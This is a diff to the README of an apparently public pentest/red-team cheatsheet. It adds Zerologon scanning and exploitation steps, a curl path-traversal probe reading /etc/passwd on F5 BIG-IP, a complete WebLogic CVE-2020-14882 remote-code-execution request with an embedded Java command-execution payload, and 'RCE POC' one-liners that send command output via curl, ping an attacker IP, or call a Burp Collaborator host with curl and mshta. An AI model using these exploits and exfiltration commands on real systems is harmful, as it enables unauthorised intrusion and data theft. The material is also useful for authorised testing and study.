@@ -4,8 +4,22 @@
 </p>
 
 
-Publicly accessible notes about my pentesting/red teaming experiments in a controlled environment that involve playing with various tools and techniques used by penetration testers and redteamers .
+Publicly accessible notes about my pentesting/red teaming experiments tested on several controlled environments/infrastructures that involve playing with various tools and techniques used by penetration testers and redteamers during a security assessment.
+
 - [x] Project in progress
+
+### Contribute
+We welcome contributions as github pull requests.<br>
+Kudos and thanks for the people who did the hard stuff
+</br>
+### Goals
+* Pentest/red team cheatsheet that collects snippets of codes and commands to help pentester during an engagement(saving time/fast search for a specific command).
+* Understand how the attacks can be performed
+* take notes for future reference
+
+> #### Disclaimer
+> For educational purposes only, use it at your own responsibility. 
+
 ## Intrusion Kill Chain
 <p align="center">
   <img src="https://camo.githubusercontent.com/9547d8152e3490a6e5e3da0279faab64340885be/68747470733a2f2f646f63732e6d6963726f736f66742e636f6d2f656e2d75732f616476616e6365642d7468726561742d616e616c79746963732f6d656469612f61747461636b2d6b696c6c2d636861696e2d736d616c6c2e6a7067" alt="KillChain"/>
@@ -55,7 +69,7 @@ Intensive Scan (Note recommended):
 bash$ nmap -p 1-65535 -Pn -A -oA output target_IP 
 ```
 Scan with enumeration of the running services version :
-* -sC : Safe Scan
+* -sC : default scripts Equivalent to --script=default
 * -sV : Get the service version
 ```bash
 bash$ nmap -sC -sV -oA output target
@@ -71,7 +85,84 @@ Download the tool from this link :
 > Go to : Preferences -> Pinging -> select Combained (UDP/TCP)
 
 # Lateral Movement and Exploitation
+### Scanning for Zerologon
+SecuraBV zerologon scanner https://github.com/SecuraBV/CVE-2020-1472<br>
+We can use crackmapexec to extract the DC name
+```bash
+bash$ python3 zerologon_tester.py EXAMPLE-DC 1.2.3.4
+```
+If the target is vulnerable the scanner showing the following output:
+<img src="https://github.com/ihebski/A-Red-Teamer-diaries/blob/master/zerologon/scanner.png" alt="zerologon scanner">
+### Exploiting zerologon
+- The exploit could reset the domain admin password we can use zer0dump exploit instead https://github.com/bb00/zer0dump
+- Dumping The admin password (change the username if only one user is targetted )
 
+<img src="https://github.com/ihebski/A-Red-Teamer-diaries/blob/master/zerologon/dump-Administrator-Password.png" alt="dump NTLM" >
+
+Getting an RCE through pass-the-hash
+<img src="https://github.com/ihebski/A-Red-Teamer-diaries/blob/master/zerologon/get_RCE_psexec.png" alt="RCE">
+
+> The provided screenshots are related to a personnel lab used for the POC test only, be careful when running the exploit on DC in PROD(during an engagement)
+
+## BIGIP F5 CVE-2020-5902
+Check if the target is vulnerable
+```bash
+curl -sk 'https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
+```
+We can scan the target using Nuclei or Nmap too
+* Nuclei
+https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/CVE-2020-5902.yaml
+```bash
+nuclei -t ~/tool/nuclei/nuclei-templates/cves/CVE-2020-5902.yaml -target https://<IP>
+```
+If multiple hosts are specified use -l argument -> -l bigip-assets.txt
+* Nmap
+```bash
+wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse
+nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
+```
+#### BIGIP RCE
+we can use Metasploit Module https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4
+
+## Scanning Weblogic CVE-2020-14882
+Nuclei Module
+```bash
+nuclei -t nuclei-templates/cves/CVE-2020-14882.yaml -target http://<IP>
+```
+This module sometimes fails, use -proxy-url http://127.0.0.1:8080 to redirect traffic into Burpsuite and investigate.
+## Exploiting Weblogic CVE-2020-14882 - RCE
+
+```bash
+POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
+Host: 172.16.242.134:7001
+cmd: chcp 65001&&whoami&&ipconfig
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1258
+
+_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
+weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
+java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
+field.setAccessible(true);
+Object obj = field.get(adapter);
+weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
+String cmd = req.getHeader("cmd");
+String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
+if (cmd != null) {
+    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
+    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
+    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
+    res.getServletOutputStream().flush();
+    res.getWriter().write("");
+}executeThread.interrupt();
+");
+```
+* Change cmd in the request header with any system command(Win/Linux)
+* Payload could be turned into a curl command.
 ## Scanning for EternalBlue ms17-010
 ```bash
 bash$ nmap -p445 --script smb-vuln-ms17-010 <target>/24
@@ -1895,12 +1986,37 @@ Dump hashes
 ```
 rlwrap nc -nlvp PORT
 ```
-### Contribute
-As an open source we a strong focus on the community We welcome contributions as github pull requests.
-Kudos and thanks for the people who did the hard stuff
-</br>
-# Goal
-* Understand how the attacks can be performed
-* Try out various industry tools and become more profficient in using them
-# Disclaimer
-For educational purposes only, use it at your own responsibility.
+# Tipis and tricks
+### RCE POC
+We can use the folloiwng tricks as an RCE POC(in some engagements, the client asks for a limited tests on RCE POCs).
+## Ping
+Pentester machine
+```bash
+tcpdump -nni <eth-adapter> -e icmp[icmptype] == 8
+```
+Under the exploit run
+```bash
+ping <Attacker-IP>
+```
+You can specify a number of pings with -c agrments, If ICMP requests recieved, RCE achieved
+
+## Curl
+Execute commands and recieve data with the POST request
+```bash
+curl -d "$(id)" 127.0.0.1:9988
+```
+Recieve data
+```bash
+nc -nlvp 9988
+```
+
+## Burpsuite Collaborator 
+Use burpcollaborator as POC
+* Linux
+```bash
+curl <burp-collaborator.com>
+```
+* Windows
+```bash
+mshta <burp-collaborator.com>
+```
